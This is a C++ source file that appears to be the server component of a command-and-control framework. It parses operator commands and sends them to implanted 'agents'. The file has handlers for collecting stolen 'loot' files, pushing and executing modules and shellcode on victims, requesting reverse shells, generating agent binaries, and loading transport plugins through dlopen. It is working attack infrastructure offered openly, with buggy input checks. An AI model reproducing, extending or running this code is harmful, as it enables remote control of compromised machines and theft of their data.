#include "connection.h"

extern Server *server;
/*constructor for the connection instance*/
ConnectionInstance::ConnectionInstance(){
    this->data = nullptr;
}

/*Neato destructor*/
ConnectionInstance::~ConnectionInstance(){
    return;
}

/*Handler for manager connections and flow*/
void ConnectionInstance::manager_handler() {
    int operation;
    int quitting = 0;
    int count = 0;
    char *ptr = NULL;
    char *dat_ptr = NULL;
    char *d_ptr = NULL;
    char tmpbf[3] = {0,0,0};
    char tmpbuffer[8];
    char filename[2048];
    char *resp = (char *)malloc(2048);
    char buff[BUFSIZ];
            
    // main instruction loop
    while (!quitting)
    {
        // reset variables for loop
        ptr = resp;
        operation = -1;
        dat_ptr = NULL;
        
        memset(buff, 0, sizeof(buff));
        memset(tmpbuffer, 0, sizeof(tmpbuffer));
        memset(filename, 0, sizeof(filename));
        memset(resp, 0, 2048);
        memset(tmpbf, 0, sizeof(tmpbf));
        
        // get operation request
        this->transport->read(this->data, &resp, 2048);
        printf("response: %s\n", resp);

        // note to self: looks like the response when it catches a 0 is actually "ok"...
        // see if there is a clever way around it in the session class??
        
        // parse it
        strncat(tmpbf,resp,2);
        operation = atoi(tmpbf);
        ptr += 3;

        this->log("Operation caught: %d\n", this->transport->get_agent_name(this->data), operation);

        // main switch
        switch (operation)
        {
        case MANAG_EXIT:
            quitting = 1;
            break;

        case MANAG_GET_LOOT:
            transport->get_loot(this->data, ptr);
            break;

        case MANAG_UP_FILE:
            // Agent_id is stored in ptr
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                this->log("Caught wrong format identifier in input\n", this->transport->get_agent_name(this->data));
                return;
            }
            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count, strlen(ptr));
            
            this->download_file(d_ptr, 1, dat_ptr);
            AgentInformationHandler::task(AGENT_DOWN_FILE, dat_ptr, d_ptr);
            break;

        case MANAG_REQ_RVSH:
            AgentInformationHandler::task(AGENT_REV_SHELL, dat_ptr, d_ptr);
            break;

        case MANAG_TASK_MODULE:
            // Agent_id is stored in ptr 
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                this->log("Wrong format identifier from input\n", this->transport->get_agent_name(this->data));
                return;
            }
            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count, strlen(ptr));
            
            this->download_file(d_ptr, 1, dat_ptr);
            
            AgentInformationHandler::task(AGENT_EXEC_MODULE, dat_ptr, d_ptr);
            break;

        case MANAG_CHECK_LOOT:
            printf("Caught loot check call\n");
            break;

        case MANAG_DOWN_FILE:
            // requested agent and filename are stored in ptr
            // by the end, filename is in d_ptr and agent is in dat_ptr
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                this->log("Wrong format identifier from input\n", this->transport->get_agent_name(this->data));
                return;
            }
            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count, strlen(ptr));
            AgentInformationHandler::task(AGENT_UP_FILE, dat_ptr, d_ptr);
            this->transport->send_ok(this->data);
            break;

        case MANAG_TASK_SC:
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                this->log("Wrong format identifier from input\n", this->transport->get_agent_name(this->data));
                return;
            }
            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count, strlen(ptr));
            
            AgentInformationHandler::task(AGENT_EXEC_SC, dat_ptr, d_ptr);
            this->transport->send_ok(this->data);
            break;

        case MANAG_GET_AGENT:
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                this->log("Wrong format identifier from input\n", this->transport->get_agent_name(this->data));
                return;
            }
            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count, strlen(ptr));

            this->transport->make_agent(this->data, dat_ptr, d_ptr);
            dat_ptr = NULL;
            this->transport->upload_file(this->data, "out/client.out", 0);
            break;

        case MANAG_REG_AGENT:
            printf("Caught agent register call\n");
            break;

        case MANAG_GET_INFO:
            this->send_info(ptr);
            break;

        case MANAG_REQ_PORTS:
            this->get_ports(ptr);
            break;

        case MANAG_CONN_RVSH:
            this->transport->init_reverse_shell(this->data, ptr);
            break;

        case MANAG_GET_TRANSPORTS:
            this->send_transports();
            break;

        case MANAG_START_TRANSPORT:
            this->setup_transport(ptr);
            break;

        default:
            this->log("Unknown operation value '%d'\n", this->transport->get_agent_name(this->data), operation);
            this->transport->send_err(this->data);
            break;
        }
    }
    free(resp);
    printf("Thread exiting...\n");
    
}

int ConnectionInstance::send_info(char *ptr){
    int size = 0;
    int rc = 0;
    char buff[BUFSIZ];
    char name[BUFSIZ];
    char *dat = NULL;
    char *tmpbf = (char*)malloc(3);

    DIR *dir;
    FILE *file;
    struct dirent *ent;

    memset(buff, 0, sizeof(buff));
    memset(name, 0, sizeof(name));
    if ((dir = opendir ("agents/")) != NULL) {
        /* print all the files and directories within directory */
        while ((ent = readdir (dir)) != NULL) {
            if(!strcmp(ent->d_name, ".") || !strcmp(ent->d_name, "..") || !strcmp(ent->d_name, "agents.dat")){
                continue;
            } else {
                memset(buff, 0, sizeof(buff));
                memset(name, 0, sizeof(name));
                sprintf(buff, "/agents/%s/info.txt", ent->d_name);
                getcwd(name, sizeof(name));
                strcat(name, buff);
                file = fopen(name, "r");
                memset(buff, 0, sizeof(buff));
                if(file == NULL){
                    this->log("Could not get info on agent %s\n", this->transport->get_agent_name(this->data), ent->d_name);
                    perror("");
                } else {
                    // get file size
                    fseek(file, 0L, SEEK_END);
                    size = ftell(file);
                    printf("Size: %d\n", size);

                    // Allocate file memory 
                    dat = (char *)malloc(size);
                    memset(dat, 0, size);
                    rewind(file);
                    fread(dat, 1, size, file);
                    printf("File data: %s\n", dat);
                    
                    rc = this->transport->write(this->data, dat, size);
                    free(dat);
                    if(rc == 1){
                        this->log("Failed to write data\n", this->transport->get_agent_name(this->data));
                        return 1;
                    }
                    
                    printf("Waiting for read...\n");
                    rc = this->transport->read(this->data, &tmpbf, 3);
                    if(rc == 1){
                        this->log("Failed to read data\n", this->transport->get_agent_name(this->data));
                        return 1;
                    }
                }
            }
        }
        rc = this->transport->write(this->data, "fi", 2);
        if(rc == 1){
            this->log("Failed to write data\n", this->transport->get_agent_name(this->data));
            return 1;
        }
        closedir (dir);
    } else {
        /* could not open directory */
        this->log("Failed to open directory\n", this->transport->get_agent_name(this->data));
            
        perror ("");
        return 2;
    }
    return 0;


}

/*Downloads file from connected entity*/
int ConnectionInstance::download_file(char *ptr, int is_manager, char *extra){
    int rc = 0;
    size_t size = 0;
    size_t size_e = 0;
    const char *data_ptr;
    unsigned char *enc_ptr;
    char buff[BUFSIZ*2];
    char tmpbuffer[256];
    char logbuff[BUFSIZ];
    FILE *file;


    rc = this->transport->send_ok(this->data);
    if(rc == 1){
        this->log("Failed to write transport data\n", this->transport->get_agent_name(this->data));
        return 1;
    }

    memset(tmpbuffer, 0, sizeof(tmpbuffer));
    rc = this->transport->read(this->data, (char**)&tmpbuffer, sizeof(tmpbuffer));
    if(rc == 1){
        this->log("Failed to read transport data\n", this->transport->get_agent_name(this->data));
        return 1;
    }

    size = atoi(tmpbuffer);
    data_ptr = (const char *)malloc(size+1);
    memset((void*)data_ptr, 0, size+1);
            
    // writes file size
    rc = this->transport->send_ok(this->data);
    if(rc == 1){
        this->log("Failed to write transport data\n", this->transport->get_agent_name(this->data));
        return 1;
    }
    printf("%lu\n", size);
    size_t tmpint = 0;
    while (tmpint < size)
    {
        rc = this->transport->read(this->data, (char **)&data_ptr+strlen(data_ptr), size-tmpint);
        if(rc == 1){
            this->log("Failed to read transport data\n", this->transport->get_agent_name(this->data));
            return 1;
        }
        tmpint += rc;
    
    }
    

    size_e = B64::dec_size(data_ptr);

    enc_ptr = (unsigned char *)malloc(size_e);
    if(!B64::decode(data_ptr, enc_ptr, size_e)){
        this->log("Failed to decode data\n", this->transport->get_agent_name(this->data));
        free((void*)data_ptr);
        free(enc_ptr);
        rc = this->transport->send_err(this->data);
        if(rc == 1){
            this->log("Failed to write transport data\n", this->transport->get_agent_name(this->data));
            return 1;
        }
        return 1;
    }
    free((void*)data_ptr);
            
    // writes file 
    rc = this->transport->send_ok(this->data);
    if(rc == 1){
        this->log("Failed to read transport data\n", this->transport->get_agent_name(this->data));
        return 1;
    }

    memset(buff, 0, sizeof(buff));
    memset(tmpbuffer, 0, sizeof(tmpbuffer));
    if(is_manager){
        sprintf(buff, "%s/agents/%s/tasking/%s", getcwd(tmpbuffer, sizeof(tmpbuffer)), extra, ptr);
    } else {
        sprintf(buff, "%s/agents/%s/loot/%s", getcwd(tmpbuffer, sizeof(tmpbuffer)), this->transport->get_agent_name(this->data), ptr);
    }
    printf("%s\n", buff);
    file = fopen(buff, "wb");
    if(file == NULL){
        perror("");
        return 1;
    }
    fwrite(enc_ptr, 1, size_e, file);
    fclose(file);
    free(enc_ptr);

    return 0;
}



/*Returns all available ports for accessing reverse shells*/
void ConnectionInstance::get_ports(char *ptr){

}

void ConnectionInstance::send_transports(){
    printf("Sending transports\n");

    // TODO: Fix this to make it dynamic (but dont know how to store transport info dynamically)
    char *tmp = (char*)malloc(256);
    char *sz = (char*)malloc(5);
    memset(tmp, 0, 256);
    memset(sz, 0, 5);
    const char *name = this->transport->get_name(this->data);
    sprintf(tmp, "%s:%d", this->transport->get_name(this->data), this->transport->get_id(this->data));
    sprintf(sz, "%ld", strlen(tmp));
    
    this->transport->write(this->data, sz, 5);
    memset(sz, 0, 5);
    this->transport->read(this->data, &sz, 3);
    
    this->transport->write(this->data, tmp, strlen(tmp));
    this->transport->read(this->data, &tmp, 3);
    free(tmp);
    free(sz);
}

/*Place holder*/
void ConnectionInstance::reverse_shell(){
    printf("Waiting for shell handling...\n");
    while(this->shell_finished) sleep(1);
}
/*Handles reverse shell connections and forwarding*/

/*Handler for agent connections and flow*/
void ConnectionInstance::agent_handler(){    
    // initialize variables
    int operation = 0;
    int quitting = 0;
    char *ptr = NULL;
    char tmpbf[3] = {0,0,0};
    char tmpbuffer[8];
    char buff[2048];
    char filename[2048];
    char *resp = (char *)malloc(2048);
    char logbuff[BUFSIZ];
    
    // enters main handler loop
    while (!quitting)
    {
        // reset buffers and variables on repeat
        ptr = resp;
        operation = -1;
        memset((void*)buff, 0, sizeof(buff));
        memset((void*)tmpbuffer, 0, sizeof(tmpbuffer));
        memset((void*)filename, 0, sizeof(filename));
        memset((void*)resp, 0, 2048);
        memset((void*)logbuff, 0, sizeof(logbuff));
        
        // gets the agent's requested tasking operation
        this->transport->read(this->data, &resp, 2048);
        
        // parses operation into buffers
        //printf("Requested tasking: %s\n", resp);
        strncat(tmpbf,resp,2);
        operation = atoi(tmpbf);
        ptr += 3;
        
        /*
        Command data structure:
            First char: 
                Describes what command it is
            Following chars:
                Optional values, separated by ',' chars
            Terminating sequence:   
                NULL
        */

        this->log("Operation caught: %d\n", this->transport->get_agent_name(this->data), operation);

        // main decision switch
        switch (operation)
        {
        case AGENT_EXIT:
            this->log("Client exiting...\n", this->transport->get_agent_name(this->data)); 
            quitting = 1;
            break;

        case AGENT_DOWN_FILE:
            sprintf(buff, "agents/%s/tasking/%s", this->transport->get_agent_name(this->data), ptr);
            this->transport->upload_file(this->data, buff, 0);
            break;

        case AGENT_UP_FILE:
            this->download_file(ptr, 0, NULL);
            break;

        case AGENT_REV_SHELL:
            this->log("Agent reverse shell caught\n", this->transport->get_agent_name(this->data));
            //this->server->get_shell_queue()->push(this);
            //this->reverse_shell();
            break;

        case AGENT_EXEC_MODULE:
            sprintf(buff, "agents/%s/tasking/%s", this->transport->get_agent_name(this->data), ptr);
            this->transport->upload_file(this->data, buff, 1);
            break;

        default:
            this->log("Unknown Operation Identifier: '%d'\n", this->transport->get_agent_name(this->data), operation);
            this->transport->send_err(this->data);
            quitting = 1;
            break;
        }
    }
    free(resp);
}

void ConnectionInstance::shell_finish(){
    this->shell_finished = 1;
}

/*Initialized the connection and prepares data structures for handlers*/
int ConnectionInstance::handle_connection(){
    // reload the logger because of threads not sharing stacks
    this->transport->listen(this->data);
    

    // creates classes and instances
    int handler = this->transport->determine_handler(this->data);
    

    // determines handler to use
    if (handler == AGENT_TYPE)
    {
        printf("Starting agent handler\n");
        this->agent_handler();
    } else if(handler == MANAG_TYPE)
    {
        printf("Starting manager handler\n");
        this->manager_handler();
    } else
    {
        // failed to handle the parsing :)
        this->log("Got Unknown Handler Type: %d\n", "GENERIC", handler);
        return 1;
    }
    return 0;
}

void ConnectionInstance::setup_transport(char *inf){
    printf("Setting up transports\n");
    class ServerTransport *transport;
    class ConnectionInstance *instance = new ConnectionInstance();

    char *port_num = NULL;

    int strl = strlen(inf);
    for(int i = 0; i < strl; i++){
        if (inf[i] == ':'){
            inf[i] = '\0';
            port_num = inf + i;
            break;
        }

    }

    int port = atoi(port_num);
    int id = atoi(inf);

    // for file in "shared/" load it, and check type. if type, check id. if id, break
    char buff[BUFSIZ];
    char path[PATH_MAX];
    sprintf(buff, "%s/shared", getcwd(path, sizeof(path)));
    DIR *dir;
    struct dirent *ent;

    int found = false;
             
    if((dir = opendir(buff)) != NULL){
        while((ent =readdir(dir)) != NULL){
            if(!strcmp(ent->d_name, ".") || !strcmp(ent->d_name, "..")){
                continue;
            } else {
                void *handle = dlopen("./shared/ssh_transport.so", RTLD_NOW);
                if(!handle) {
                    this->log("Failed to load .so file\n", this->transport->get_agent_name(this->data));    
                    return;
                }

                int id_sym = *(int *)dlsym(handle, "id");

                if(id_sym == id){
                    found = true;
                    const int type = *(const int *)dlsym(handle, "type");
                    if(!type) {
                        printf("Failed to find type symbol!\n");
                        break;
                    }
                    else printf("Detected type of object: %d\n", type);
                    
                    ptransport_t transport;
                    void (*entrypoint)();
                    pthread_t thread;
                    void *args[4] = {transport, &thread, &port};
                    
                    switch(type){
                        case MODULE:
                            printf("Detected module type\n");
                            
                            entrypoint = (void (*)())dlsym(handle, "entrypoint");
                            if (!entrypoint){
                                printf("Failed to locate the module's entrypoint function");
                                break;
                            }
                            (*entrypoint)();
                            break;
                        case TRANSPORT:
                            printf("Detected transport type\n");
                            transport = (ptransport_t)dlsym(handle, "transport_api");
                            if(!transport) {
                                printf("Failed to find transport API structure\n"); 
                                break;
                            }

                            if(pthread_create(&thread, NULL, init_instance, (void*)args)){
                                this->log("Error creating thread\n", this->transport->get_agent_name(this->data));
                                break;
                            }
                            break;
                
                        default:
                            printf("Unknown type: %d\n", type);
                            break;
                    }
                    
                }
                else dlclose(handle);
                

            }
        }
    }

    closedir(dir);
    
}

/*Sets the transport for the connection instance*/
void ConnectionInstance::set_transport(ptransport_t transport){
    this->transport = transport;
}

ptransport_t ConnectionInstance::get_transport(){
    return this->transport;
}

void *ConnectionInstance::get_data(){
    return this->data;
}

void ConnectionInstance::set_thread(pthread_t thread){
    this->thread = thread;
}

void ConnectionInstance::set_data(void *data){
    this->data = data;
}

void ConnectionInstance::set_server(class Server *server){
    this->server = server;
}